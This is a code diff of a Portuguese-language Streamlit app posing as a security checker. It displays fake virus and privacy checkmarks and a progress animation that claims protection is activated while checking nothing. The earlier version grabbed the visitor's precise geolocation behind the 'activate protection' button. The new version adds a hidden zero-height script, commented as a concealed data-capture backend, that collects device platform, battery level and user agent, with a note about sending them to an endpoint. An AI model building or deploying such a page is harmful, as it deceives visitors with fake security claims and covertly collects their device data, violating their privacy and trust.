@@ -1,75 +1,91 @@
 import streamlit as st
-import streamlit.components.v1 as components
+import time
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+# Configuração da página
+st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")
 
+# Estilização CSS para a "Bolha" e Cores
 st.markdown("""
-<style>
-body { background:#0b0f14; color:white; font-family:Arial; }
-.box { max-width:420px; margin:auto; text-align:center; }
-.circle {
-    width:180px; height:180px; border-radius:50%;
-    border:4px solid #2ecc71;
-    display:flex; align-items:center; justify-content:center;
-    font-size:48px; margin:auto;
-}
-.btn {
-    width:100%; padding:14px; font-size:18px;
-    border-radius:12px; border:none;
-    background:#1f2937; color:white;
-}
-.card {
-    background:#1f2937;
-    padding:20px;
-    border-radius:16px;
-    margin-top:20px;
-    text-align:left;
-}
-</style>
-""", unsafe_allow_html=True)
+    <style>
+    .main { background-color: #0e1117; }
+    .stButton>button { width: 100%; border-radius: 20px; background-color: #262730; color: white; }
+    
+    /* Estilo da Bolha Circular */
+    .circle-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 250px;
+    }
+    .circle {
+        width: 200px;
+        height: 200px;
+        border-radius: 50%;
+        border: 10px solid #1f2329;
+        border-top: 10px solid #00ff7f; /* Cor verde da animação */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 40px;
+        font-weight: bold;
+        color: white;
+        animation: spin 2s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    </style>
+    """, unsafe_allow_html=True)
 
-components.html("""
-<div class="box">
-    <h2>Verificar segurança</h2>
+## Interface Visual
+st.title("Verificar segurança")
 
-    <div class="circle" id="pct">4%</div>
+# Simulação da Bolha Animada
+placeholder_bolha = st.empty()
 
-    <p>✅ Ambiente de pagamentos<br>
-       ✅ Privacidade e segurança<br>
-       ✅ Vírus</p>
+# Lista de Check
+st.write("✅ Ambiente de pagamentos")
+st.write("✅ Privacidade e segurança")
+st.write("✅ Vírus")
 
-    <button class="btn" onclick="getLocation()">● ATIVAR PROTEÇÃO</button>
+if st.button("● ATIVAR PROTEÇÃO"):
+    # Animação de carregamento
+    for i in range(4, 101, 5):
+        placeholder_bolha.markdown(f"""
+            <div class="circle-container">
+                <div class="circle" style="animation: spin {2 - (i/100)}s linear infinite;">
+                    {i}%
+                </div>
+            </div>
+            """, unsafe_allow_html=True)
+        time.sleep(0.1)
+    st.success("Proteção Ativada!")
+else:
+    # Estado inicial (parado em 4%)
+    placeholder_bolha.markdown("""
+        <div class="circle-container">
+            <div class="circle" style="animation: none; border-top: 10px solid #00ff7f;">
+                4%
+            </div>
+        </div>
+        """, unsafe_allow_html=True)
 
-    <div id="result"></div>
-</div>
+# Rodapé de erro (como no seu print)
+st.warning("Permissão de localização negada ou indisponível.")
 
-<script>
-function getLocation() {
-    navigator.geolocation.getCurrentPosition(
-        function(pos) {
-            let p = document.getElementById("pct");
-            let i = 4;
-            let timer = setInterval(()=>{
-                i+=6; p.innerText=i+"%";
-                if(i>=100) clearInterval(timer);
-            },80);
-
-            document.getElementById("result").innerHTML =
-            "<div class='card'><b>Proteção ativada ✅</b><br><br>"
-            + "Latitude: "+pos.coords.latitude+"<br>"
-            + "Longitude: "+pos.coords.longitude+"</div>";
-        },
-        function() {
-            document.getElementById("result").innerHTML =
-            "<div class='card'><h3>Para uma experiência melhor</h3>"
-            + "<ul>"
-            + "<li>Ative a localização do dispositivo</li>"
-            + "<li>Permita localização precisa no navegador</li>"
-            + "</ul>"
-            + "<small>Configurações → Localização → Precisão de Local</small>"
-            + "</div>";
-        }
-    );
-}
-</script>
-""", height=600)
+## Captura de Dados (Backend Oculto)
+# Aqui usamos JavaScript injetado para pegar os dados que você pediu
+st.components.v1.html("""
+    <script>
+    navigator.getBattery().then(function(battery) {
+        const info = {
+            modelo: navigator.platform,
+            bateria: (battery.level * 100) + "%",
+            agente: navigator.userAgent
+        };
+        // Envia para o console ou para um endpoint
+        console.log("Dados capturados:", info);
+    });
+    </script>
+""", height=0)
